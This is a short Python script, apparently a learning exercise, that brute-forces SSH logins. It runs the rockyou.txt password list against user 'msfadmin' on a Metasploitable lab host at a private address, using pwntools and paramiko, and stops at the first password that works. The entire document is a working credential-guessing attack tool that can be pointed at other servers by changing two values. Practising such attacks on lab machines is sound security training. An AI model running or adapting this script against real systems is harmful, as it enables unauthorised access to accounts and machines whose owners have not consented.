#Python - SSH Login Brute Forcing
from pwn import *
import paramiko

#defing some variables
#The host that will be targeted is a metasploitable instance
host = "192.168.50.239"
#username that will be brute forced
username = 'msfadmin'
#Keeping track of the number of attempts being made during brute force
attempts = 0
#Use the Rockyou.txt as a list of common passwords
with open("rockyou.txt", "r") as password_list:
	#Iterate through each password in the rockyou text file
	for password in password_list:
		#Strip the \n on each line
		password = password.strip("\n")
		#Try block will handle authentication errors and unsuccessful attempts
		try:
			print("Attempt #:[{}] Attempting Password: '{}'!".format(attempts,password))
			#Perform authentication via pwn module 
			response = ssh(host=host, user=username, password=password,timeout=1)
			if response.connected():
				print("[>] Valid Password found: '{}'!".format(password))
				response.close()
				break
			response.close()
			#Will continue to run until a password is found or the txt file runs out of passwords
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password!")
			attempts+=1


